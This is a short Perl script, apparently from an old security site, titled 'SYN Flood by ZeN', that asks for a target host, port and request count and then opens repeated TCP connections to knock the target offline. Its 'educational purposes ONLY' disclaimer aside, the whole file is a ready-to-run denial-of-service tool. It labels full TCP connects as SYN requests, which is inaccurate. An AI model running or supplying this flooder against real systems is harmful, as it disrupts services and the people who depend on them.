#!/usr/bin/perl
use IO::Socket;
print q{


-------------------------------------------                                       
 SSSS  YY YY  NN   NN           FFFFF   //      
 S      YvY   NNN  NN           FF     ---------------------     
 SSSS    Y    NN N NN           FF    L   OOOO OOOO  DD    | 
    S    Y    NN  NNN    \=-=\  FFFF  L   O  O O  O  D D   |    
 SSSS    Y    NN   NN           FF    L   O  O O  O  D D   |        
------------------------------  FF    LLL OOOO OOOO  DD    |      
    by ZeN                 //                              | 
                          ----------------------------------

Disclaimer :

This script is for educational purposes ONLY. Neither me nor
dusecurity.com are responsable for how you use this script.
                                 
Visit : www.dusecurity.com 




};

print "Target : ";
$serv = <stdin>;
chop ($serv);
print "Port : ";
$port = <stdin>;
chop ($port);
print "SYN Requests to send : ";
$times = <stdin>;
chop ($times);

for ($i=0; $i<$times; $i++)
{
$len = length $form;
$get1 = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$serv", PeerPort => "$port") || die "Can't Connect, DoS'ed?.\n";
syswrite STDOUT, "[*]SYN request: $i\n";
}

print "\n\nEnd of SYN Flood\n\n\n";
print "Press any Enter to exit...";
$end = <stdin>;
chop ($end);